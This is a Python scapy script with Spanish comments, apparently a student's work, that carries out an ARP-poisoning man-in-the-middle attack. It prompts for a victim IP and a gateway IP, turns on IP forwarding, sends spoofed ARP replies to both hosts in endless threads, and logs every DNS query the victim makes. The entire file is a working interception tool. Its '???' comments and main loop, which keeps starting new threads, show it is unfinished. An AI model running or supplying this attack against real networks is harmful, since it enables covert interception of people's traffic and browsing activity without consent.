#!/usr/bin/env python3
# encoding: utf-8
from scapy.all import *
import os
import sys
import threading
# *** En caso de que las interfaces no tengan el mismo nombre en victima y atacante se pone la del atacante

print("Asegurate que estás ejecutando el programa como root")
victim = input("Introduce la IP de la victima: ")
gateway = input("Introduce la IP del gateway: ")
interface = input("Introduce el nombre de la interfaz de red: ")


# Escribimos un 1 en ese fichero para asegurarnos que permitimos el reenvio
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def v_poison():  # Envía la respuesta ARP a la victima

    # Objeto ARP:
    # pdst = target, psrc = IP a actualizar en la tabla arp, ¿No Falta el hwsrc?
    v = ARP(pdst=victim, psrc=gateway)
    while True:
        try:
            send(v, verbose=0, inter=1, loop=1)
        except KeyboardInterrupt:
            sys.exit(1)


def gw_poison(): # Envía la respuesta ARP al gateway
    gw = ARP(pdst=gateway, psrc=victim)
    while True:
        try:
            send(gw, verbose=0, inter=1, loop=1)
        except KeyboardInterrupt:
            sys.exit(1)

def dnshandle(pkt):
    # Strip what information you need from the packet capture
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        print('Victim: '+victim + ' has searched for: ' + str(pkt.getlayer(DNS).qd.qname))


vthread = []
gwthread = []

while True:  # Threads que están esuchando y reenviando paquetes

    # ???
    vpoison = threading.Thread(target=v_poison)
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()
    # ???
    gwpoison = threading.Thread(target=gw_poison)
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()

    pkt = sniff(iface=interface, filter='udp port 53', prn=dnshandle)
